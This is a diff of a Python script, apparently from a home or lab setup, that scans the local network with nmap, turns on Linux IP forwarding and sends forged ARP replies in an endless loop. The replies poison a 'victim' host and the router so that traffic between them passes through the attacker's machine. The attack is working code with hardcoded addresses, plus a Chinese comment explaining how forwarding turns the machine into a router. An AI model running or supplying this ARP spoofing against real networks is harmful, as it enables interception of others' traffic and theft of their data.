@@ -73,11 +73,22 @@ def getHwAddr(ifname):
         '256s', bytes(ifname, 'utf-8')[:15]))
     return ':'.join('%02x' % b for b in info[18:24])
 
-def port_forwarding():
+"""
+https://unix.stackexchange.com/questions/14056/what-is-kernel-ip-forwarding
+https://linuxconfig.org/how-to-turn-on-off-ip-forwarding-in-linux
+
+開啟 linux ip forwarding, 可以使整台機器像台 router, 
+一旦收到不屬於此 local machine 的封包, 就往 gateway 送
+"""
+def enable_port_forwarding():
     flag = 1
     flag = str(flag)
     os.system('echo ' + flag + ' > /proc/sys/net/ipv4/ip_forward')
 
+def disable_port_forwarding():
+    flag = 0
+    flag = str(flag)
+    os.system('echo ' + flag + ' > /proc/sys/net/ipv4/ip_forward')
 
 if __name__ == "__main__":
     
@@ -100,6 +111,7 @@ if __name__ == "__main__":
             ip = i
             break
 
+    print(nicmac)
     result = nmap(ip)
     print(result)
 
@@ -138,12 +150,12 @@ if __name__ == "__main__":
     for i in range(0,len(ip)):
         print("%-18s       %s" % (ip[i],mac[i]))
 
-    victimpacket = ARP(op=2, pdst="192.168.1.104", hwdst="08:00:27:DF:EF:2C",
-                       psrc="192.168.1.1", hwsrc="7c:76:35:a9:6c:a8")
+    victimpacket = ARP(op=2, pdst="192.168.1.101", hwdst="08:00:27:34:C8:8F",
+                       psrc="192.168.1.1", hwsrc="08:00:27:25:A4:94")
     routerpacket = ARP(op=2, pdst="192.168.1.1", hwdst="38:6B:1C:C3:8C:68",
-                       psrc="192.168.1.104", hwsrc="7c:76:35:a9:6c:a8")
+                       psrc="192.168.1.101", hwsrc="08:00:27:25:A4:94")
 
-    port_forwarding()
+    enable_port_forwarding()
     while(1):
         send(victimpacket)
         send(routerpacket)
